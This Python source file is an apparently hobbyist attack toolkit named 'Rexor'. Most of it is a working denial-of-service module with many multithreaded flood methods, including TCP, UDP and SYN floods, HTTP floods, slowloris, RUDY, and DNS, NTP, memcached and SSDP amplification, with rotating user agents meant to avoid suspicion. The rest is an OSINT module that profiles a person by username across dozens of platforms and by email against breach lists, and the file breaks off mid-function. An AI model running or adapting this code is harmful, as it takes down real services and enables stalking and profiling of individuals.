import socket
import threading
import time
import random
import os
import sys
import json
import re
import subprocess
import hashlib
import base64
import struct
import ssl
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.syntax import Syntax
from rich.layout import Layout
from rich import box
from rich.text import Text
import urllib.parse
import colorama
from colorama import Fore, Style, init

init()
ce = Console()

VERSION = "26.03.83"

# Tuff ascii art from patorjk tools acid 3d i think
BANNER = """[bold red]
 █▀▀▀▀▀▀▀▀▀▀▄▄▀▄▄        ▄▀▀▀▀▀▀▄▄▀▄▄ ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄       ▄▄▀▀▀▀▀▄▄▀▄▄    █▀▀▀▀▀▀▀▀▀▀▄▄▀▄▄
██      ■ ▄▄ ▀▄█▀▄    ▄▀▀        ██▀▄██▀▀▀▀▀███▄▀█▀▀▀▀▄██   ▄▀▀   ■ ▄▄ ▀▄█▀▄  ██      ■ ▄▄ ▀▄█▀▄
▀▄▄         ▀▄ ██▀▄  ██  ▄■·     █ ██▐▌▌ ▄■·█████ ▄■· ████ ██         ▀▄ ██▀▄ ▀▄▄         ▀▄ ██▀▄
 ▐▌▌   █▀▄▄   ▌▐▌█▐▌▐▌▌▄▀  ▄▀▀▄▄▀█▄▀ ▐▌▌▐   ███▐▌▌    ████▐▌▌    ▄▀▄▄   ▌▐▌█▐▌ ▐▌▌   █▀▄▄   ▌▐▌█▐▌
  ██   █▄▄▀   ▄████ ██ ▌  █▄▄▄▄▄▄     ▀▄▄ ░░█████ ▒▄▀▐██████    █████ ░   ████  ██   █▄▄▀   ▄████
  ██ ░▒░░░░ ▄█▀█▄   ██  ░░ ■  ████      ██▐▌▀▄▄▀▀▐▓ ▌████ ██ ░  █████ ▒▒▒ ████  ██ ░▒░░░░ ▄█▀█▄
 ▐▌▌▒▒▌█▀▄░▒░▀██▀▄  ██ ▒▒█▐█▀▀▀▀▀     ▄▀▀▄▓▓▄▄▄▄▄░▒▌████  ██▐▒▒ ██ ██▐▓▓▓▌█ ██ ▐▌▌▒▒▌█▀▄░▒░▀██▀▄
 ▐▌▌▓▓▌████▐▓▄ ██▐▌ ██ ░▓▓▄▀▄▄▀▀▄█▀▄ ▐▌▌▓▓▓▌▄▄▄▄▄ ▓▓▐████ ▐▌▌▓▓▓▄▀▄▀▀▄█▓▒▐▌█▐▌ ▐▌▌▓▓▌████▐▓▄ ██▐▌
 ██▐▓▒▌████▐▒░▌████ ▐▌▌ ░▒▒░▄▄▄▌▀▄█▀▄▐▌▌▒▒▒ █████ ▒▒▒▐████ ██▐▓▒░█▄▄█░▒░▌████  ██▐▓▒▌████▐▒░▌████
▄▀▀▐░█▌████▐▓▀▄▀ ▄▀  ▀▄▄ ▀▀██▓▒░ █  ██  ░░░ ████  ░░░ ████  ▀▄▄▀▀▒░▓▓░▓▀▄▀ ▄▀ ▄▀▀▐░█▌████▐▓▀▄▀ ▄▀
█▄▄▄▄▄▄▄███▄▀▀▄▀▀      ▀▀▄▄▄▄▄▄▀▀▄▀▀ █▄▄▄▄▄▄████▄▄▄▄▄▄████    ▀▀▄▄▄▄▄▄▀▀▄▀▀   █▄▄▄▄▄▄▄███▄▀▀▄▀▀
[/bold red]"""

# just a pile of user agents so requests dont look too suspicious
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# every platform i could think of for username lookups
PLATFORMS = {
    "instagram": "https://www.instagram.com/{}",
    "twitter": "https://twitter.com/{}",
    "github": "https://github.com/{}",
    "youtube": "https://www.youtube.com/@{}",
    "reddit": "https://www.reddit.com/user/{}",
    "tiktok": "https://www.tiktok.com/@{}",
    "facebook": "https://www.facebook.com/{}",
    "snapchat": "https://www.snapchat.com/add/{}",
    "telegram": "https://t.me/{}",
    "pinterest": "https://www.pinterest.com/{}",
    "twitch": "https://www.twitch.tv/{}",
    "steam": "https://steamcommunity.com/id/{}",
    "spotify": "https://open.spotify.com/user/{}",
    "soundcloud": "https://soundcloud.com/{}",
    "medium": "https://medium.com/@{}",
    "devianart": "https://www.deviantart.com/{}",
    "flickr": "https://www.flickr.com/people/{}",
    "vimeo": "https://vimeo.com/{}",
    "dribbble": "https://dribbble.com/{}",
    "behance": "https://www.behance.net/{}",
    "patreon": "https://www.patreon.com/{}",
    "cashapp": "https://cash.app/${}",
    "paypal": "https://www.paypal.me/{}",
    "venmo": "https://venmo.com/{}",
    "onlyfans": "https://onlyfans.com/{}",
    "linktree": "https://linktr.ee/{}",
    "aboutme": "https://about.me/{}",
    "keybase": "https://keybase.io/{}",
    "hackernews": "https://news.ycombinator.com/user?id={}",
    "lobsters": "https://lobste.rs/u/{}",
    "producthunt": "https://www.producthunt.com/@{}",
    "roblox": "https://www.roblox.com/user.aspx?username={}",
    "chess": "https://www.chess.com/member/{}",
    "tryhackme": "https://tryhackme.com/p/{}",
    "hackthebox": "https://app.hackthebox.com/profile/{}",
    "gitlab": "https://gitlab.com/{}",
    "bitbucket": "https://bitbucket.org/{}",
    "wikipedia": "https://en.wikipedia.org/wiki/User:{}",
    "wordpress": "https://{}.wordpress.com",
    "tumblr": "https://{}.tumblr.com",
    "etsy": "https://www.etsy.com/people/{}",
    "quora": "https://www.quora.com/profile/{}",
    "slideshare": "https://www.slideshare.net/{}",
    "disqus": "https://disqus.com/by/{}",
    "pastebin": "https://pastebin.com/u/{}",
    "buzzfeed": "https://www.buzzfeed.com/{}",
    "wattpad": "https://www.wattpad.com/user/{}",
    "goodreads": "https://www.goodreads.com/{}",
    "letterboxd": "https://letterboxd.com/{}",
    "myanimelist": "https://myanimelist.net/profile/{}",
    "codecademy": "https://www.codecademy.com/profiles/{}",
    "codewars": "https://www.codewars.com/users/{}",
    "leetcode": "https://leetcode.com/{}",
    "replit": "https://replit.com/@{}",
    "jsfiddle": "https://jsfiddle.net/user/{}",
    "codepen": "https://codepen.io/{}",
    "hubpages": "https://hubpages.com/@{}",
    "instructables": "https://www.instructables.com/member/{}",
    "mixcloud": "https://www.mixcloud.com/{}",
    "bandcamp": "https://{}.bandcamp.com",
    "reverbnation": "https://www.reverbnation.com/{}",
    "discogs": "https://www.discogs.com/user/{}",
    "lastfm": "https://www.last.fm/user/{}",
    "imgur": "https://imgur.com/user/{}",
    "giphy": "https://giphy.com/{}",
    "dailymotion": "https://www.dailymotion.com/{}",
    "livejournal": "https://{}.livejournal.com",
    "myspace": "https://myspace.com/{}",
    "sourceforge": "https://sourceforge.net/u/{}/",
    "launchpad": "https://launchpad.net/~{}",
    "askfm": "https://ask.fm/{}",
    "strava": "https://www.strava.com/athletes/{}",
    "untappd": "https://untappd.com/user/{}",
    "ravelry": "https://www.ravelry.com/people/{}",
    "vsco": "https://vsco.co/{}/gallery",
    "weheartit": "https://weheartit.com/{}",
}

# well known ports and what services usually run on them
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1723: "PPTP",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB", 5000: "UPnP",
    9200: "Elasticsearch", 11211: "Memcached", 25565: "Minecraft", 5060: "SIP",
    9090: "Webmin", 8888: "Jupyter", 3000: "Grafana", 9000: "SonarQube",
    8000: "Django-Dev", 8081: "HTTP-Alt2", 8880: "HTTP-Alt3",
}

# list of subdomains to check during domain recon
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "admin", "blog", "shop", "api", "dev",
    "cdn", "vpn", "webmail", "remote", "portal", "staging", "test",
    "beta", "app", "dashboard", "monitor", "status", "docs",
    "support", "help", "secure", "auth", "login", "signup",
    "m", "mobile", "static", "assets", "media", "images", "img",
    "files", "download", "upload", "forum", "community", "news",
    "store", "pay", "billing", "my", "account", "profile",
    "internal", "corp", "intranet", "jenkins", "git", "svn",
    "wiki", "confluence", "jira", "kibana", "grafana", "prometheus",
    "registry", "docker", "k8s", "kubernetes", "api-docs", "swagger",
]

# fingerprints we look for to confirm a profile actually exists on a platform
PLATFORM_FINGERPRINTS = {
    "instagram": ["Login", "Sign up", "log in", "accounts/login"],
    "twitter": ["This account doesn't exist", "Sorry, that page doesn"],
    "github": ["Find repositories", "Sign in to GitHub"],
    "reddit": ["page not found", "Sorry, nobody on Reddit"],
    "tiktok": ["Couldn't find this account", "page not found"],
    "facebook": ["The link you followed may be broken", "page isn't available"],
    "onlyfans": ["This page is not available", "Page Not Found"],
    "snapchat": ["This content could not be found", "Sorry!"],
    "youtube": ["This channel does not exist", "404 Not Found"],
    "steam": ["The specified profile could not be found", "Error"],
    "twitch": ["Sorry. Unless you", "time machine"],
    "spotify": ["Page not found", "We can't seem to find"],
    "pinterest": ["We couldn't find that page", "Nothing found"],
}


class Stats:
    """thread safe stats tracking for attacks so we dont get race conditions"""

    def __init__(self):
        self.packets = 0
        self.bytes = 0
        self.errors = 0
        self.start_time = 0
        self.method = ""
        self.lock = threading.Lock()

    def add_packet(self, size=0):
        with self.lock:
            self.packets += 1
            self.bytes += size

    def add_error(self):
        with self.lock:
            self.errors += 1

    def get_elapsed(self):
        return time.time() - self.start_time if self.start_time else 0

    def get_pps(self):
        elapsed = self.get_elapsed()
        return self.packets / elapsed if elapsed > 0 else 0

    def reset(self, method):
        with self.lock:
            self.packets = 0
            self.bytes = 0
            self.errors = 0
            self.start_time = time.time()
            self.method = method.upper()


class RexorFloods:
    """all the attack methods live here, tried to make them as efficient as possible"""

    def __init__(self):
        self.running = False
        self.stats = Stats()
        self.sock_list = []
        self.sock_lock = threading.Lock()

    def _gen_payload(self, size):
        return random._urandom(size)

    def _add_socket(self, s):
        with self.sock_lock:
            self.sock_list.append(s)

    def _cleanup_sockets(self):
        with self.sock_lock:
            for s in self.sock_list:
                try: s.close()
                except: pass
            self.sock_list.clear()

    def _tcp_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.send(self._gen_payload(size))
                self.stats.add_packet(size)
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _udp_flood(self, ip, port, size):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        while self.running:
            try:
                s.sendto(self._gen_payload(size), (ip, port))
                self.stats.add_packet(size)
            except:
                self.stats.add_error()
        s.close()

    def _syn_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.3)
                s.connect_ex((ip, port))
                self.stats.add_packet()
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _ack_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.3)
                s.connect((ip, port))
                s.send(self._gen_payload(size))
                self.stats.add_packet(size)
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _fin_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.3)
                s.connect((ip, port))
                s.send(self._gen_payload(size))
                self.stats.add_packet(size)
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _rst_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect_ex((ip, port))
                self.stats.add_packet()
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _xmas_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect_ex((ip, port))
                self.stats.add_packet()
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _http_flood(self, ip, port, path, use_ssl=False):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(1)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                ua = random.choice(USER_AGENTS)
                methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"]
                payload = (
                    f"{random.choice(methods)} {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n\r\n"
                )
                s.send(payload.encode())
                self.stats.add_packet(len(payload))
                self._add_socket(s)
            except:
                self.stats.add_error()

    def _https_flood(self, ip, port, path):
        self._http_flood(ip, 443 if port == 80 else port, path, True)

    def _slow_read_flood(self, ip, port, path, use_ssl=False):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                s.send(
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n".encode()
                )
                self.stats.add_packet()
                self._add_socket(s)
                while self.running:
                    try:
                        s.recv(1)
                        time.sleep(random.uniform(5, 15))
                    except: break
            except:
                self.stats.add_error()

    def _icmp_flood(self, ip, size):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        except PermissionError:
            ce.print("[bold red][!] ICMP requires root/admin[/bold red]")
            return
        while self.running:
            try:
                s.sendto(self._gen_payload(size), (ip, 0))
                self.stats.add_packet(size)
            except:
                self.stats.add_error()

    def _loris_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((ip, port))
                s.send(
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html\r\n"
                    f"Connection: keep-alive\r\n".encode()
                )
                self.stats.add_packet()
                self._add_socket(s)
                for _ in range(random.randint(100, 500)):
                    if not self.running: break
                    try:
                        s.send(f"X-a: {random._urandom(random.randint(5,20)).hex()}\r\n".encode())
                        self.stats.add_packet()
                        time.sleep(random.uniform(1, 10))
                    except: break
            except:
                self.stats.add_error()

    def _rudy_flood(self, ip, port, path):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((ip, port))
                cl = random.randint(1000000, 10000000)
                s.send(
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {cl}\r\n"
                    f"Connection: keep-alive\r\n\r\n".encode()
                )
                self.stats.add_packet()
                self._add_socket(s)
                while self.running:
                    try:
                        s.send(self._gen_payload(random.randint(1, 10)))
                        self.stats.add_packet(10)
                        time.sleep(random.uniform(5, 15))
                    except: break
            except:
                self.stats.add_error()

    def _dns_amp_flood(self, ip, dns_server, query):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                tid = random.randint(0, 65535)
                flags = 0x0100
                qdcount = 1
                header = struct.pack('!HHHHHH', tid, flags, qdcount, 0, 0, 0)
                qname = b''.join(struct.pack('B', len(p)) + p.encode() for p in query.split('.')) + b'\x00'
                question = qname + struct.pack('!HH', 255, 1)
                s.sendto(header + question, (dns_server, 53))
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _ntp_amp_flood(self, ip, ntp_server):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'\x17\x00\x03\x2a' + b'\x00' * 44
        while self.running:
            try:
                s.sendto(payload, (ntp_server, 123))
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _memcached_amp_flood(self, ip, mem_server):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                s.sendto(b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n', (mem_server, 11211))
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _ssdp_amp_flood(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
        while self.running:
            try:
                s.sendto(payload, ('239.255.255.250', 1900))
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _chargen_flood(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                s.sendto(self._gen_payload(512), (ip, 19))
                self.stats.add_packet(512)
            except:
                self.stats.add_error()

    def _smurf_flood(self, ip, broadcast):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except: return
        while self.running:
            try:
                s.sendto(self._gen_payload(64), (broadcast, 0))
                self.stats.add_packet(64)
            except:
                self.stats.add_error()

    def _land_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.bind((ip, port))
                s.connect((ip, port))
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _teardrop_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.send(b'\x00' * 28)
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _ping_of_death(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except: return
        while self.running:
            try:
                s.sendto(self._gen_payload(65500), (ip, 0))
                self.stats.add_packet(65500)
            except:
                self.stats.add_error()

    def _connection_exhaust(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                self._add_socket(s)
                self.stats.add_packet()
            except:
                self.stats.add_error()

    def _bandwidth_flood(self, ip, port, size):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try: s.connect((ip, port))
        except: return
        while self.running:
            try:
                s.send(self._gen_payload(size))
                self.stats.add_packet(size)
            except: break

    def _build_table(self):
        """builds the live stats display that shows during attacks"""
        elapsed = self.stats.get_elapsed()
        pps = self.stats.get_pps()
        mbps = (self.stats.bytes * 8 / 1000000) / elapsed if elapsed > 0 else 0
        table = Table(
            show_header=True, header_style="bold red", border_style="red",
            box=box.HEAVY, title="[bold red]REXOR FLOODS - LIVE[/bold red]", title_style="bold red"
        )
        table.add_column("[bold red]METRIC[/bold red]", style="red")
        table.add_column("[bold red]VALUE[/bold red]", style="red")
        table.add_row("[red]Method[/red]", f"[bold red]{self.stats.method}[/bold red]")
        table.add_row("[red]Packets[/red]", f"[bold red]{self.stats.packets:,}[/bold red]")
        table.add_row("[red]Data[/red]", f"[bold red]{self.stats.bytes/1024/1024:.2f} MB[/bold red]")
        table.add_row("[red]Errors[/red]", f"[bold red]{self.stats.errors:,}[/bold red]")
        table.add_row("[red]Elapsed[/red]", f"[bold red]{elapsed:.1f}s[/bold red]")
        table.add_row("[red]PPS[/red]", f"[bold red]{pps:,.1f}[/bold red]")
        table.add_row("[red]Throughput[/red]", f"[bold red]{mbps:.2f} Mbps[/bold red]")
        table.add_row("[red]Sockets[/red]", f"[bold red]{len(self.sock_list)}[/bold red]")
        return table

    def stop(self):
        self.running = False
        self._cleanup_sockets()

    def ddos(self, method, ip, port=80, threads=100, sockets=50, size=1024,
             path="/", use_ssl=False, extra=""):
        methods_map = {
            'tcp': lambda: self._tcp_flood(ip, port, size),
            'udp': lambda: self._udp_flood(ip, port, size),
            'syn': lambda: self._syn_flood(ip, port, size),
            'ack': lambda: self._ack_flood(ip, port, size),
            'fin': lambda: self._fin_flood(ip, port, size),
            'rst': lambda: self._rst_flood(ip, port, size),
            'xmas': lambda: self._xmas_flood(ip, port, size),
            'http': lambda: self._http_flood(ip, port, path, use_ssl),
            'https': lambda: self._https_flood(ip, port, path),
            'slowread': lambda: self._slow_read_flood(ip, port, path, use_ssl),
            'icmp': lambda: self._icmp_flood(ip, size),
            'loris': lambda: self._loris_flood(ip, port),
            'rudy': lambda: self._rudy_flood(ip, port, path),
            'dnsamp': lambda: self._dns_amp_flood(ip, extra or "8.8.8.8", "google.com"),
            'ntpamp': lambda: self._ntp_amp_flood(ip, extra or "pool.ntp.org"),
            'memamp': lambda: self._memcached_amp_flood(ip, extra or "127.0.0.1"),
            'ssdp': lambda: self._ssdp_amp_flood(ip),
            'chargen': lambda: self._chargen_flood(ip, port),
            'smurf': lambda: self._smurf_flood(ip, extra or "255.255.255.255"),
            'land': lambda: self._land_flood(ip, port),
            'teardrop': lambda: self._teardrop_flood(ip, port),
            'pod': lambda: self._ping_of_death(ip),
            'connexhaust': lambda: self._connection_exhaust(ip, port),
            'bandwidth': lambda: self._bandwidth_flood(ip, port, size),
        }
        if method not in methods_map:
            ce.print("[bold red]Invalid method[/bold red]")
            return False
        self.stop()
        self.running = True
        self.stats.reset(method)
        for _ in range(sockets):
            threading.Thread(target=methods_map[method], daemon=True).start()
        try:
            with Live(self._build_table(), console=ce, refresh_per_second=4, screen=False) as live:
                while self.running:
                    live.update(self._build_table())
                    time.sleep(0.25)
        except KeyboardInterrupt:
            self.stop()
            ce.print("\n[bold red][!] STOPPED[/bold red]")
        return True


class RexorOSINT:
    """all the osint / recon stuff, tried to make username lookups actually work reliably"""

    def __init__(self):
        # using a session for connection reuse and speed
        self.session = __import__('requests').Session()
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        self.session.verify = False
        # suppress ssl warnings cuz theyre annoying
        try:
            __import__('urllib3').disable_warnings()
        except: pass

    def _check_profile(self, platform, url):
        """check if a profile exists on a given platform by looking at status code and page content"""
        try:
            resp = self.session.get(
                url, timeout=10, allow_redirects=True,
                headers={"User-Agent": random.choice(USER_AGENTS)}
            )
            # some sites redirect missing profiles to homepage or login
            if resp.status_code == 200:
                content = resp.text.lower()
                # check fingerprints for known "not found" patterns
                if platform in PLATFORM_FINGERPRINTS:
                    for fp in PLATFORM_FINGERPRINTS[platform]:
                        if fp.lower() in content:
                            return (platform, False, url)
                    return (platform, True, url)
                # generic check - if page is too small or has obvious error indicators
                if len(resp.text) < 1000:
                    if any(phrase in content for phrase in ["not found", "doesn't exist", "page not found", "404", "couldn't find", "sorry"]):
                        return (platform, False, url)
                # if we got here, assume the profile exists
                return (platform, True, url)
            elif resp.status_code == 404:
                return (platform, False, url)
            else:
                # some sites return 302 or other codes for non-existent profiles
                return (platform, False, url)
        except __import__('requests').exceptions.ConnectionError:
            return (platform, False, url)
        except __import__('requests').exceptions.Timeout:
            return (platform, False, url)
        except Exception:
            return (platform, False, url)

    def username_search(self, username):
        """searches for a username across all platforms we know about"""
        ce.print(f"\n[bold red]╔══════════════════════════════════════╗[/bold red]")
        ce.print(f"[bold red]║ USERNAME SEARCH: {username:<20}║[/bold red]")
        ce.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]")

        found = []
        total = len(PLATFORMS)
        completed = 0

        # show a progress bar while we search, looks more professional
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold red]{task.description}[/bold red]"),
            BarColumn(bar_width=40, style="red", complete_style="bold red"),
            TextColumn("[bold red]{task.completed}/{task.total}[/bold red]"),
            console=ce,
        ) as progress:
            task = progress.add_task("[red]Scanning platforms...[/red]", total=total)

            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = {}
                for platform, url_template in PLATFORMS.items():
                    url = url_template.format(username)
                    futures[executor.submit(self._check_profile, platform, url)] = platform

                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        found.append(result)
                    completed += 1
                    progress.update(task, completed=completed)

        # build and display results table
        ce.print("\n")
        table = Table(
            title="[bold red]USERNAME SEARCH RESULTS[/bold red]",
            border_style="red", box=box.HEAVY, show_lines=True
        )
        table.add_column("[bold red]PLATFORM[/bold red]", style="red", no_wrap=True)
        table.add_column("[bold red]STATUS[/bold red]", style="red", justify="center")
        table.add_column("[bold red]PROFILE URL[/bold red]", style="red")

        found_count = 0
        for platform, exists, url in found:
            if exists:
                status = "[bold green]✓ FOUND[/bold green]"
                found_count += 1
            else:
                status = "[dim red]✗ NOT FOUND[/dim red]"
            table.add_row(f"[red]{platform.title()}[/red]", status, f"[red]{url}[/red]")

        ce.print(table)
        ce.print(f"\n[bold red][+] Found on {found_count}/{total} platforms[/bold red]")

        # show quick summary of where the user was found
        if found_count > 0:
            ce.print(f"\n[bold red][*] Profiles found on:[/bold red]")
            for platform, exists, url in found:
                if exists:
                    ce.print(f"[bold green]    ✓ {platform.title()}: {url}[/bold green]")
        else:
            ce.print(f"\n[bold red][!] No profiles found for '{username}'[/bold red]")

    def email_osint(self, email):
        ce.print(f"\n[bold red]╔══════════════════════════════════════╗[/bold red]")
        ce.print(f"[bold red]║ EMAIL OSINT: {email:<23}║[/bold red]")
        ce.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]\n")
        if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
            ce.print("[bold red][!] That doesnt look like a valid email address[/bold red]")
            return
        username, domain = email.split("@")[0], email.split("@")[1]
        ce.print(f"[bold red][+] Username part: {username}[/bold red]")
        ce.print(f"[bold red][+] Domain: {domain}[/bold red]")
        # mx records
        ce.print(f"\n[bold red][*] Checking mail servers (MX records)...[/bold red]")
        try:
            import dns.resolver
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in answers:
                ce.print(f"[bold red]    └─ {rdata.exchange} (priority: {rdata.preference})[/bold red]")
        except Exception:
            ce.print("[bold red]    └─ Could not resolve MX records[/bold red]")
        # breach check
        ce.print(f"\n[bold red][*] Checking data breaches...[/bold red]")
        try:
            resp = __import__('requests').get(
                f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}",
                headers={"hibp-api-key": "no-key", "User-Agent": "Rexor"},
                timeout=15
            )
            if resp.status_code == 200:
                breaches = resp.json()
                ce.print(f"[bold red]    Found in {len(breaches)} breach(es):[/bold red]")
                for b in breaches[:15]:
                    ce.print(f"[bold red]    └─ {b['Name']} ({b['BreachDate']}) - {b.get('Description','')[:120]}...[/bold red]")
            elif resp.status_code == 404:
                ce.print("[bold green]    └─ No breaches found! This email looks clean.[/bold green]")
            else:
                ce.print(f"[bold red]    └─ API returned status {resp.status_code}[/bold red]")
        except Exception:
            ce.print("[bold red]    └─ Could not check breaches (rate limited or offline)[/bold red]")
        # gravatar
        gravatar_hash = hashlib.md5(email.lower().strip().encode()).hexdigest()
        ce.print(f"\n[bold red][*] Gravatar: https://www.gravatar.com/avatar/{gravatar_hash}?s=200[/bold red]")
        # also try to find social media using the email username
        ce.print(f"\n[bold red][*] Searching social media using email username...[/bold red]")
        self.username_search(username)

    def phone_osint(self, phone):
